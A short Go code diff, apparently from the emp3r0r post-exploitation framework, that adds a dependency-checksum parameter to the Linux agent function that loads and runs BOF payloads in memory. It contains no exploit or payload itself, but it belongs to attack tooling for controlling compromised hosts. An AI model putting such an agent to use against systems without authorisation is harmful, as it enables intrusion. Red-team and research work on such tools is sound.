@@ -7,10 +7,11 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
+	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
 )
 
 // runCOFFModule executes a BOF payload on Linux.
-func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uintptr) (out string, err error) {
+func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uintptr, depChecksum string) (out string, err error) {
 	defer func() {
 		if r := recover(); r != nil {
 			err = fmt.Errorf("runCOFFModule panic: %v", r)
@@ -27,7 +28,7 @@ func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uint
 		args = append(args, coffloader.CoffArg{WireType: a.WireType, Value: a.Value})
 	}
 
-	return coffloader.RunLinuxCOFF(payload, invocation.Coff.Export, args, token)
+	return coffloader.RunLinuxCOFF(payload, invocation.Coff.Export, args, token, memdeps.WithChecksum(depChecksum))
 }
 
 // runDLLModule is Windows-only; DLL modules are not supported on Linux agents.
